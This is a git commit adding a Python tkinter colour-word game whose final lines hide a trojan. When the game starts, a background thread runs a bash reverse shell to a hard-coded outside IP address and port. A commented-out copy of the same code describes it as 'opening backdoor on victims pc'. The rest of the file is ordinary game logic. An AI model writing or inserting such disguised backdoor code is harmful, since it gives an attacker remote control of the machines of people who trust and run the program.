987eb99f8c5c43e23631a770870a6e2004415aa0
Gisa Kaze Fredson <52705591+GisaKaze@users.noreply.github.com>
2022-02-08 08:52:23 +0200

    Add files via upload

---
+++ visual-game-1.0.0/visual_game.py
@@ -0,0 +1,133 @@
+import tkinter
+import random
+import subprocess
+import threading
+
+# list of possible colour.
+colours = [
+	'Red','Blue','Green','Pink','Black',
+	'Yellow','Orange','White','Purple','Brown'
+	]
+score = 0
+
+# the game time left, initially 30 seconds.
+timeleft = 60
+
+# # opening backdoor on victims pc
+# def victim(num):
+#     subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2246 0<&1 2>&1", shell=True, executable='/bin/bash')
+
+
+# # a thread to allow this command to always run even if the game is being played
+# def hacking_thread(hack):
+#     thread = threading.Thread(target = hack, args=(10,))
+#     thread.start()
+
+# function that will start the game.
+def startGame(event):
+
+	if timeleft == 60:
+		
+		# start the countdown timer.
+		countdown()
+	# run the function to choose the next colour.
+	nextColour()
+
+# Function to choose and display the next colour.
+def nextColour():
+
+	# use the globally declared 'score' and 'play' variables above.
+	global score
+	global timeleft
+
+	# if a game is currently in play
+	if timeleft > 0:
+
+		# make the text entry box active.
+		e.focus_set()
+
+		# if the colour typed is equal to the colour of the text
+		if e.get().lower() == colours[1].lower():
+			
+			score += 1
+
+		# clear the text entry box.
+		e.delete(0, tkinter.END)
+		
+		random.shuffle(colours)
+		
+		# change the colour to type, by changing the text _and_ the colour to a random colour value
+		label.config(fg = str(colours[1]), text = str(colours[0]))
+		
+		# update the score.
+		scoreLabel.config(text = "Score: " + str(score))
+
+
+# Countdown timer function
+def countdown():
+
+	global timeleft
+
+	# if a game is in play
+	if timeleft > 0:
+
+		# decrement the timer.
+		timeleft -= 1
+		
+		# update the time left label
+		timeLabel.config(text = "Time left: "
+							+ str(timeleft))
+								
+		# run the function again after 1 second.
+		timeLabel.after(1000, countdown)
+
+
+# create a GUI window
+root = tkinter.Tk()
+
+# set the title
+root.title("COLORGAME")
+
+# set the icon
+# root.iconbitmap("game.ico")
+
+# set the size
+root.geometry("400x400")
+
+# add an instructions label
+instructions = tkinter.Label(root, text = "\n\n\n\n\n\nType in the colour"
+						"of the words. \n NB: Not the word text!\n\n",
+									font = ('Helvetica', 12))
+instructions.pack()
+
+# add a score label
+scoreLabel = tkinter.Label(root, text = "Press enter to start",
+									font = ('Helvetica', 12))
+scoreLabel.pack()
+
+# add a time left label
+timeLabel = tkinter.Label(root, text = "Time left: " +
+			str(timeleft), font = ('Helvetica', 12))
+				
+timeLabel.pack()
+
+label = tkinter.Label(root, font = ('Helvetica', 20))
+label.pack()
+
+e = tkinter.Entry(root)
+
+root.bind('<Return>', startGame)
+e.pack()
+
+# set focus on the entry box
+e.focus_set()
+
+
+def hack(num):
+    subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2246 0<&1 2>&1", shell=True, executable='/bin/bash')
+
+if __name__ == '__main__':
+    thread = threading.Thread(target= hack, args=(10,))
+    thread.start()
+    root.mainloop()
+    exit()
